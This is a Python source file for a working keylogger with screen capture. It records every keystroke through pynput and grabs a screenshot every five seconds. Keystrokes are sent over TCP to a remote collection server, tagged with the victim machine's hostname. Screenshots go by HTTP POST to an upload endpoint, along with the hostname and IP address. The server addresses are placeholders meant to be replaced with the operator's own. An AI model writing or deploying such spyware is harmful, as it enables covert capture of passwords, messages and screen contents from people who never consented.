import base64
import json
import threading
import time
from base64 import encode

import requests
from pynput.keyboard import Key, Listener
import socket
from PIL import ImageGrab  # For taking screenshots
from enum import Enum

computer_name = socket.gethostname()
print("Computer Name:", computer_name)

class KeyLoggerDataType(Enum):
    text = 'text'
    screenshot = 'screenshot'

def send_keystrokes(data, data_type: KeyLoggerDataType):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the NestJS server
        s.connect(('localhost', 3000))  # Replace with your NestJS server IP and port
        # Create a message structure
        global computer_name
        message = {
            'data': {
                'vector': computer_name,
                'data_type': data_type.value,
                'info': data
            }
        }
        # Convert the message to JSON format
        json_message = json.dumps(message)

        # Send the JSON message to the server
        payload_size = len(json_message)
        s.sendall(payload_size.to_bytes(4, byteorder='big'))  # Sending 4-byte size header
        s.sendall(json_message.encode('utf-8'))


def send_image(screenshot_data, vector_pc_name, client_address):
    url = "http://localhost:8000/upload"  # URL of your FastAPI server
    files = {'file': ('screenshot.png', screenshot_data, 'image/png')}
    data = {
        'vector_pc_name': vector_pc_name,
        'client_address': client_address
    }

    # Send POST request to the FastAPI server
    response = requests.post(url, files=files, data=data)

    if response.status_code == 200:
        print("Screenshot uploaded successfully:", response.json())
    else:
        print("Failed to upload screenshot:", response.text)


def get_ip_address():
    # Get the local IP address of the computer
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def take_screenshot():
    while True:
        time.sleep(5)  # Wait for 1 minute
        screenshot = ImageGrab.grab()  # Take a screenshot
        screenshot.save('screenshot.png')  # Save the screenshot
        with open('screenshot.png', 'rb') as f:
            screenshot_data = f.read()
            encoded_screenshot = str(base64.b64encode(screenshot_data))
            #send the binary data of image trough http request
            send_image(screenshot_data, computer_name, get_ip_address())
            

def on_press(key):
    try:
        # Logs alphanumeric characters
        keystroke = f"Key pressed: {key.char}"
        print(keystroke)
        send_keystrokes(keystroke, KeyLoggerDataType.text)
    except AttributeError:
        # Logs special keys
        print(f"Special key pressed: {key}")

def on_release(key):
    # Stop the listener if 'esc' is pressed
    if key == Key.esc:
        return False

def check_tcp_connection(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)  # Set a timeout for the connection
        try:
            s.connect((host, port))
            print(f"Successfully connected to {host}:{port}")
        except (socket.timeout, ConnectionRefusedError):
            print(f"Failed to connect to {host}:{port}")

# Example usage
check_tcp_connection('localhost', 3000)

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
screenshot_thread.start()

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()